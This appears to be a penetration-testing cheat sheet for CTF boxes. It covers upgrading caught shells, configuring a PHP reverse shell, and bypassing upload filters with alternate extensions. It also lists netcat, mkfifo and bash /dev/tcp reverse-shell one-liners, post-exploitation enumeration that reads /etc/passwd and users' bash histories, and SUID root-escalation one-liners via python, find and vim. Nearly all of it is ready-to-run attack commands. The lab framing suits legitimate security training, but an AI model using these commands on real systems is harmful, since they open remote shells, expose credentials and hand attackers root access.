# Shell Upgrades, Reverse Shells & Post-Exploitation Basics

Reference for after you get initial access. These steps come up on every single box.

---

## PTY Shell Upgrade — Full Sequence

After catching a reverse shell you usually have a dumb shell — no tab completion, no arrow keys, Ctrl+C kills it. Upgrade immediately.

**Step 1 — Spawn a PTY with Python:**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> **Common mistake:** Missing the single quotes around the Python code.
> `python3 -c import pty; pty.spawn("/bin/bash")` — WRONG. The shell sees the semicolon as a command separator and breaks the one-liner. The entire Python code block must be wrapped in single quotes.

If python3 isn't available try:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python2 -c 'import pty; pty.spawn("/bin/bash")'
```

**Step 2 — Set terminal type:**
```bash
export TERM=xterm
```

**Step 3 — Background the shell and fix terminal settings:**
```
Ctrl+Z
stty raw -echo; fg
```

Press Enter once or twice after `fg`. Now you have full tab completion, arrow keys, and Ctrl+C works without killing the shell.

**If you lose the shell and need to reset your terminal:**
```bash
reset
```

---

## Reverse Shell Setup — Pre-installed in Kali

Kali ships with ready-to-use webshells:
```bash
ls /usr/share/webshells/
ls /usr/share/webshells/php/
```

### PHP Reverse Shell (pentestmonkey — most common)
```bash
cp /usr/share/webshells/php/php-reverse-shell.php ~/shell.php
nano ~/shell.php
```

Edit these two lines near the top:
```php
$ip = 'YOUR_TUN0_IP';   # your VPN IP, not your LAN IP
$port = 4444;
```

Find your tun0 IP:
```bash
ip addr show tun0
```

### Set Up Listener First
Always start your listener before triggering the shell:
```bash
nc -lvnp 4444
```

### File Upload Filter Bypass
If the upload form blocks .php, try these extensions:
```
shell.php5
shell.phtml
shell.pHp
shell.php.jpg
shell.pHp5
```

---

## Netcat Reverse Shell One-liners

```bash
# netcat-traditional (supports -c flag)
nc TARGET_IP 4444 -c /bin/bash

# mkfifo method (works on any netcat)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc TARGET_IP 4444 > /tmp/f

# bash built-in
bash -i >& /dev/tcp/TARGET_IP/4444 0>&1
```

> **netcat-openbsd** (default on many systems) strips the `-e` and `-c` flags. If `-c` doesn't work, install or use `netcat-traditional`, or use the mkfifo method which works on either version.

Check which version you have:
```bash
nc -h 2>&1 | head -5
```
If it shows `-c shell commands` you have traditional. If it doesn't mention `-c` or `-e` you have openbsd.

---

## Post-Exploitation First Steps (in order)

Run these immediately after getting a shell — before anything else:

```bash
# 1. Who are you
whoami
id

# 2. What can you run as sudo (ALWAYS first privesc check)
sudo -l

# 3. What OS and kernel version
uname -a
cat /etc/os-release

# 4. Find user flag
find / -name user.txt 2>/dev/null
find / -name "*.txt" 2>/dev/null | grep -v proc | grep -v sys

# 5. Find SUID binaries
find / -user root -perm /4000 2>/dev/null
# Alternative syntax (equivalent):
find / -perm -u=s -type f 2>/dev/null

# 6. Check bash history
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null

# 7. Check for interesting files
ls -la /home/
ls -la /root/ 2>/dev/null
cat /etc/passwd
```

---

## SUID Privesc — Common Exploitable Binaries

If any of these show up in your SUID find output, go straight to GTFOBins:
**gtfobins.github.io**

High value targets:
```
python / python2.7 / python3
perl
find
vim / vi
bash
nmap
less
more
man
cp
```

### Python SUID Exploit
```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# -p preserves the effective UID (root via SUID)
```

### Find SUID Exploit
```bash
find . -exec /bin/sh -p \; -quit
```

### Vim SUID Exploit
```bash
vim -c ':!/bin/sh'
```

---

## Locating Flags

```bash
# Standard CTF flag locations
find / -name user.txt 2>/dev/null
find / -name root.txt 2>/dev/null
find / -name flag.txt 2>/dev/null
find / -name "*.txt" 2>/dev/null | grep -v "/proc\|/sys\|/usr/share"

# Read once found
cat /home/username/user.txt
cat /root/root.txt
```

---

## Quick Reference — What Runs Where

| Shell Type | Upgrade Command |
|---|---|
| Python available | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| Script available | `script /dev/null -c bash` |
| No Python or script | `export TERM=xterm` at minimum |

| Netcat Type | Reverse Shell Flag |
|---|---|
| netcat-traditional | `-c /bin/bash` |
| netcat-openbsd | use mkfifo method |
| Either | bash -i >& /dev/tcp/IP/PORT 0>&1 |
